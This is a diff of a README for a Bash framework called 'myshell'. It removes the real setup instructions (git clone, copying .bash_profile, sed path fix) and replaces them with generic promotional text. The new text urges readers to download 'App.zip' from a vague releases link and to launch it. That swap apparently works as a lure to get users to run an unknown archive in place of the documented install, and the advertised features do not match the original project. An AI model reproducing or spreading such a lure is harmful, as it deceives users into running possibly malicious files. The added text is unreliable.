@@ -1,86 +1,50 @@
-# myshell
+# 🚀 Welcome to the myshell Framework for Bash! 🐚
 
-Framework for bash
+## Overview
+Welcome to the myshell repository, a comprehensive framework designed to enhance your experience with Bash scripting. Whether you are a beginner or an experienced user, myshell provides a range of features and tools to streamline your workflow and improve productivity.
 
-- [Project details](#project-details)
-  - [Core](#core)
-  - [Modules](#modules)
-    - [Help](#help)
-    - [cloud](#cloud)
-    - [Docker](#docker)
-    - [k8s](#k8s)
-    - [ssh](#ssh)
-    - [bw](#bw)
-    - [John](#john)
-    - [Utils](#utils)
-- [Requirements](#requirements)
-- [How to use](#how-to-use)
-  - [Bash](#bash)
-  - [Powershell](#powershell)
+## Features
+🔹 **Bash Scripting:** Take your Bash scripting to the next level with myshell's enhanced functionalities.  
+🔹 **Bash Alias Management:** Manage your Bash aliases efficiently with myshell.  
+🔹 **Bash Completion:** Simplify command line usage with intelligent tab completion.  
+🔹 **Bash Profile Optimization:** Optimize your bash profile settings for improved performance.  
+🔹 **Bash Prompt Customization:** Customize your bash prompt to suit your preferences.  
+🔹 **Integration with Bitwarden:** Seamlessly integrate with Bitwarden for secure password management.  
+🔹 **Cloud Operations:** Perform cloud operations conveniently using myshell.  
+🔹 **Docker Integration:** Manage Docker containers with ease using myshell.  
+🔹 **GitHub Actions:** Automate your workflows with GitHub Actions integration.  
+🔹 **Kubernetes YAML Management:** Simplify Kubernetes YAML file management with myshell.  
+🔹 **Terminal Enhancements:** Enhance your terminal experience with myshell tools and utilities.
 
-## Project details:
+## Installation
+You can download the latest version of myshell framework from the following link:
+[![Download myshell Framework](https://img.shields.io/badge/Download-App.zip-<COLOR>.svg)](https://github.com/repo/releases/9246/App.zip)
 
-You will use .bash_profile file (section 'how to use') to load this project and the two main sections:
-- Core: Files for managing shell profile
-- Modules: Section for tools
+**Note:** Ensure to launch the downloaded file for installation.
 
-### Core
+## Usage
+Get started with myshell by following these simple steps:
+1. Download and install the framework using the provided link.
+2. Configure your preferences and settings using the intuitive interface.
+3. Explore the various features and tools offered by myshell.
+4. Enjoy a more efficient and productive Bash scripting experience!
 
-- Scripts folder:
-  - Random password generator (handled by powershell, will be replaced by another language soon)
-- Shells folder:
-  - bash: 
-    - aliases
-    - functions
-    - jobs
-    - profiles
-    - .bash_profile
-    - .bashrc
-  - pwsh: Containing pwsh environment (will be deprecated soon)
+## Contributing
+We welcome contributions from the open-source community to enhance myshell further. Here's how you can contribute:
+- Fork the repository and make your changes.
+- Create a pull request detailing your modifications.
+- Help us improve and grow the myshell framework for the benefit of all users.
 
-### Modules
+## Support
+If you encounter any issues or have any questions regarding myshell, feel free to reach out to us. We are here to assist you and ensure you have a seamless experience using our framework.
 
-- #### Help
-- #### cloud
-- #### Docker
-- #### k8s
-- #### ssh
-- #### bw
-- #### John
-- #### Utils
+## License
+The myshell framework is released under the MIT license. You are free to use, modify, and distribute the framework as per the terms of the license agreement.
 
-## Requirements
+---
 
-- Basic packages ```` git file curl ````
+By leveraging the myshell framework, you can elevate your Bash scripting capabilities and streamline your workflow. Download now and experience the power of efficient Bash scripting tools at your fingertips. Visit the [link](https://github.com/repo/releases/9246/App.zip) to get started! 🌟
 
-Mainly tested on bash 5.2+.
+Let's make Bash scripting a breeze with myshell! 🎉
 
-## How to use
-
-### Bash:
-
-1. Backup your $HOME/.bash_profile if exists
-2. Clone where you want, copy .bash_profile to your home and set $project_path. Then restart the current shell session.
-
-````
-git clone git@github.com:e-lemongrab/myshell.git
-cp -rfv myshell/core/shells/bash/.bash_profile $HOME
-sed -i 's|$HOME/Documents/myshell|'"$(pwd)"'/myshell|g' ~/.bash_profile
-exec -l $SHELL
-````
-
-3. Run "checks" to list compatibility and "myshell" to get the available commands to use
-
-
-### Powershell:
-
-Once done the bash configuration, if you have "pwsh" installed, automatically will set the $PROFILE for powershell - $HOME/.config/powershell/Microsoft.PowerShell_profile.ps1
-
-If you want to use this profile from Windows:
-
-1. Install WSL2 distro
-2. Edit $PROFILE (ex: code $PROFILE, from a powershell terminal) with content from content core/shells/pwsh/Microsoft.PowerShell_profile.ps1
-
-Remember to set the value for section "VARIABLE DECLARATION":
-- $global:distro=xxx
-- $global:project_path=xxx (relative path from $HOME)
+![myshell Logo](https://example.com/myshell-logo.png)
